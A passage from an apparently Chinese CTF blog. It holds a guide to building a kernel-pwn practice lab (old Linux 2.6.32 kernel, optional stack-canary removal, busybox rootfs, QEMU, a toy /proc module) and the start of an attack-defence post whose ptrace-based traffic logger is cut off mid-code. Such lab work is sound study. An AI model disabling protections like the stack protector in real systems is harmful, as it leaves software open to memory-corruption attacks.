  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-kernel-pwn-env" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/13/kernel-pwn-env/" class="article-date">
  <time datetime="2020-09-13T14:47:47.000Z" itemprop="datePublished">2020-09-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/13/kernel-pwn-env/">kernel pwn环境搭建</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Kernel-pwn-环境搭建"><a href="#Kernel-pwn-环境搭建" class="headerlink" title="Kernel pwn 环境搭建"></a>Kernel pwn 环境搭建</h1><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>去官网下载一份kernel内核源码, 这里就采用<a target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.tar.gz">2.6.32</a>版本。我采用docker 下的ubuntu16.04进行编译内核, 编译内核前需要拥有特定的版本的make和gcc, g++</p>
<p>获取不同版本的内核:</p>
<p><a target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/kernel/">获取</a></p>
<h3 id="安装特定的编译器"><a href="#安装特定的编译器" class="headerlink" title="安装特定的编译器"></a>安装特定的编译器</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-4.7 g++-4.7</span><br><span class="line">sudo ln -s /usr/bin/gcc-4.7 /usr/bin/gcc</span><br><span class="line">sudo ln -s /usr/bin/g++-4.7 /usr/bin/g++</span><br></pre></td></tr></table></figure>



<h3 id="安装必备依赖"><a href="#安装必备依赖" class="headerlink" title="安装必备依赖"></a>安装必备依赖</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libncurses5-dev</span><br></pre></td></tr></table></figure>



<h3 id="获取内核代码"><a href="#获取内核代码" class="headerlink" title="获取内核代码"></a>获取内核代码</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir kernel</span><br><span class="line"><span class="built_in">cd</span> kernel</span><br><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.tar.gz</span><br><span class="line">tar xzvf linux-2.6.32.tar.gz</span><br></pre></td></tr></table></figure>



<h3 id="获取特定的make"><a href="#获取特定的make" class="headerlink" title="获取特定的make"></a>获取特定的make</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/gnu/make/make-3.80.tar.gz</span><br><span class="line">tar -xvf make-3.80.tar.gz</span><br><span class="line"><span class="built_in">cd</span> make-3.80/</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>



<h3 id="修改三处-2-6-源码文件"><a href="#修改三处-2-6-源码文件" class="headerlink" title="修改三处 2.6 源码文件"></a>修改三处 2.6 源码文件</h3><ul>
<li>1.arch/x86/vdso/Makefile 中第 28 行的 -m elf_x86_64 改成 -m64，第 72 行的-m elf_i386 改成-m32</li>
<li>2.drivers/net/igbvf/igbvf.h 中注释第 128 行</li>
<li>3.kernel/timeconst.pl 中第 373 行 defined(@val) 改成 @val</li>
<li>4.（可选）关闭 canary 保护需要编辑源码中的.config 文件 349 行，注释掉 CONFIG_CC_STACKPROTECTOR=y 这一项</li>
</ul>
<h3 id="配置kernel"><a href="#配置kernel" class="headerlink" title="配置kernel"></a>配置kernel</h3><p>进入 kernel hacking，勾选 Kernel debugging，Compile-time checks and  compiler options–&gt;Compile the kernel with debug info，Compile the  kernel with frame pointers 和 KGDB</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../make-3.80/make bzImage</span><br></pre></td></tr></table></figure>



<h3 id="编译时遇到的问题"><a href="#编译时遇到的问题" class="headerlink" title="编译时遇到的问题"></a>编译时遇到的问题</h3><h4 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal error: linux/compiler-gcc5.h: No such file or directory</span><br></pre></td></tr></table></figure>

<p>解决:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">拷贝一个自己目录下的compiler-gcc4.h到compiler-gcc5.h</span><br></pre></td></tr></table></figure>

<h4 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implicit declaration of function &#x27;tty_port_users&#x27;</span><br></pre></td></tr></table></figure>

<p>解决:</p>
<p>将所提示的该函数extern关键字去掉</p>
<h3 id="编译成功"><a href="#编译成功" class="headerlink" title="编译成功"></a>编译成功</h3><p>编译成功之后提示如下:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Root device is (0, 78)</span><br><span class="line">Setup is 13688 bytes (padded to 13824 bytes).</span><br><span class="line">System is 3961 kB</span><br><span class="line">CRC e70b803a</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>

<p>vmlinux 在源码根目录下，bzImage 在arch/x86/boot/下</p>
<h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2><h3 id="获取busybox"><a href="#获取busybox" class="headerlink" title="获取busybox"></a>获取busybox</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.27.2.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.27.2.tar.bz2</span><br></pre></td></tr></table></figure>



<h3 id="配置busybox"><a href="#配置busybox" class="headerlink" title="配置busybox"></a>配置busybox</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> busybox-1.27.2</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>勾选 Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary</p>
<h3 id="编译并安装busybox"><a href="#编译并安装busybox" class="headerlink" title="编译并安装busybox"></a>编译并安装busybox</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>



<h3 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h3><p>编译完成后源码目录下会有一个_install 文件夹</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="line">mkdir etc/init.d</span><br><span class="line">touch etc/init.d/init</span><br></pre></td></tr></table></figure>

<p>编辑 etc/inittab 文件，加入以下内容（这一步可以省略）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>编辑 etc/init.d/rcS 文件，加入以下内容</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">/bin/mount -n -t sysfs none /sys</span><br><span class="line">/bin/mount -t ramfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br></pre></td></tr></table></figure>

<p>接着就可以打包成 rootfs.cpio</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./etc/init.d/rcS</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>



<h2 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h2><h3 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install qemu</span><br></pre></td></tr></table></figure>



<p>得到这三个vmlinux,bzImage,rootfs.cpio 文件后，可以利用 qemu 运行起来，启动脚本 boot</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line"> -initrd rootfs.cpio \</span><br><span class="line"> -kernel bzImage \</span><br><span class="line"> -nographic \</span><br><span class="line"> -append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot;</span> \</span><br><span class="line"> -m 64M \</span><br><span class="line"> -monitor /dev/null \</span><br></pre></td></tr></table></figure>



<p>启动成功如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Please press Enter to activate this console. [    3.379764] async/1 used greatest stack depth: 5064 bytes left</span><br><span class="line">/bin/ash: can&#x27;t access tty; job control turned off</span><br><span class="line">/ # ls</span><br><span class="line">bin      etc      proc     sbin     usr</span><br></pre></td></tr></table></figure>



<h2 id="编写与打开内核驱动"><a href="#编写与打开内核驱动" class="headerlink" title="编写与打开内核驱动"></a>编写与打开内核驱动</h2><h3 id="内核驱动c代码编写"><a href="#内核驱动c代码编写" class="headerlink" title="内核驱动c代码编写"></a>内核驱动c代码编写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;You write something.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;hello driver init!\n&quot;</span>);</span><br><span class="line">    create_proc_entry(<span class="string">&quot;hello&quot;</span>, <span class="number">0666</span>, <span class="number">0</span>)-&gt;write_proc = hello_write;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;hello driver exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>

<p>保存为hello.c</p>
<h3 id="Makefile编写"><a href="#Makefile编写" class="headerlink" title="Makefile编写"></a>Makefile编写</h3><p>注意, Makefile中 obj-m 中的名字要与保存c代码的文件名相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hello.o</span><br><span class="line">KERNELDR := /home/kernel/linux<span class="number">-2.6</span><span class="number">.32</span></span><br><span class="line">PWD := $(shell pwd)</span><br><span class="line">modules:</span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules</span><br><span class="line">modules_install:</span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install</span><br><span class="line">clean:</span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) clean</span><br></pre></td></tr></table></figure>

<p>make 出来后得到.ko 文件</p>
<h3 id="编写打开程序"><a href="#编写打开程序" class="headerlink" title="编写打开程序"></a>编写打开程序</h3><p>命名为call.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/hello&quot;</span>, O_WRONLY);</span><br><span class="line">    write(fd, <span class="string">&quot;I0gan&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --static call.c -o call</span><br></pre></td></tr></table></figure>

<p>将hello.ko与call两个文件复制到busybox下的_install目录下重新打包得到rootfs.cpio, 把该文件复制到启动目录下, 重新运行./boot</p>
<h3 id="启动自己的内核驱动"><a href="#启动自己的内核驱动" class="headerlink" title="启动自己的内核驱动"></a>启动自己的内核驱动</h3><h4 id="挂载驱动"><a href="#挂载驱动" class="headerlink" title="挂载驱动"></a>挂载驱动</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod hello.ko</span><br></pre></td></tr></table></figure>

<p>输出如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[   75.062554] hello: module license &#x27;unspecified&#x27; taints kernel.</span><br><span class="line">[   75.063843] Disabling lock debugging due to kernel taint</span><br><span class="line">[   75.074570] hello driver init!</span><br></pre></td></tr></table></figure>



<h4 id="调用打开自己的驱动"><a href="#调用打开自己的驱动" class="headerlink" title="调用打开自己的驱动"></a>调用打开自己的驱动</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # ./call </span><br><span class="line">[   79.011811] You write something./ </span><br></pre></td></tr></table></figure>

<p>上面打印了You write somthing说明已经打开了我们的驱动, 那么到这基本上已经差不多了 ^_^</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/13/kernel-pwn-env/" data-id="ckhemv801000gwdcmedrmgadi" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-awd-pwn-attack-script" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/13/awd-pwn-attack-script/" class="article-date">
  <time datetime="2020-09-13T01:45:21.000Z" itemprop="datePublished">2020-09-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/13/awd-pwn-attack-script/">awd pwn attack script</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="AWD-PWN"><a href="#AWD-PWN" class="headerlink" title="AWD PWN"></a>AWD PWN</h1><p>打了好几次awd, 始终都没好好弄个批量攻击脚本与批量提交flag, 今天它来了, 环境是pwn docker</p>
<h2 id="AWD-WAF"><a href="#AWD-WAF" class="headerlink" title="AWD WAF"></a>AWD WAF</h2><p>awd waf方便抓取对方攻打的流量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * orignal author: yangshuangfu</span></span><br><span class="line"><span class="comment"> * github link: https://github.com/yangshuangfu/PwnWAF</span></span><br><span class="line"><span class="comment"> * modified author: i0gan</span></span><br><span class="line"><span class="comment"> * github link: https://github.com/i0gan/pwn/env/awd/waf.c</span></span><br><span class="line"><span class="comment"> * modified time  : 2020-09-18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// complie:</span></span><br><span class="line"><span class="comment">// gcc waf.c -o waf</span></span><br><span class="line"><span class="comment">// before you use it, you should backup your binary file, then rename waf as binary name</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME <span class="meta-string">&quot;./pwn&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGNAME <span class="meta-string">&quot;./log&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MACHINE 64</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEW_CONNECT_SHOW_STR <span class="meta-string">&quot;\n************** new attack *************\n&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_SHOW_STR        <span class="meta-string">&quot;\nread:\n&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_SHOW_STR       <span class="meta-string">&quot;\nwrite:\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">SYSTYPE</span> &#123;</span></span><br><span class="line">	READ,</span><br><span class="line">	WRITE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> state = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_standard</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> fd == <span class="number">1</span> || fd == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_log</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span>* addr, <span class="keyword">int</span> size, <span class="keyword">enum</span> SYSTYPE flag)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(LOGNAME, O_CREAT|O_APPEND|O_WRONLY, <span class="number">0666</span>);</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> data;</span><br><span class="line">	<span class="keyword">char</span>* buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">		data = ptrace(PTRACE_PEEKDATA, pid, addr + i, <span class="literal">NULL</span>);</span><br><span class="line">		buf[i] = data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 判断是否状态是否发生变化,发生变化就写入不同的状态</span></span><br><span class="line">	<span class="keyword">if</span>(state != flag)	&#123;</span><br><span class="line">		<span class="keyword">if</span>(flag == READ)</span><br><span class="line">			write(fd, READ_SHOW_STR, <span class="keyword">sizeof</span>(READ_SHOW_STR));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			write(fd, WRITE_SHOW_STR, <span class="keyword">sizeof</span>(WRITE_SHOW_STR));</span><br><span class="line">		state = flag;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	write(fd, buf, size);</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_new_attack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 分割每次攻打的符号</span></span><br><span class="line">	<span class="keyword">int</span> fd = open(LOGNAME, O_CREAT|O_APPEND|O_WRONLY, <span class="number">0666</span>);</span><br><span class="line">	write(fd, NEW_CONNECT_SHOW_STR, <span class="keyword">sizeof</span>(NEW_CONNECT_SHOW_STR));</span><br><span class="line">	close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">	<span class="keyword">int</span> 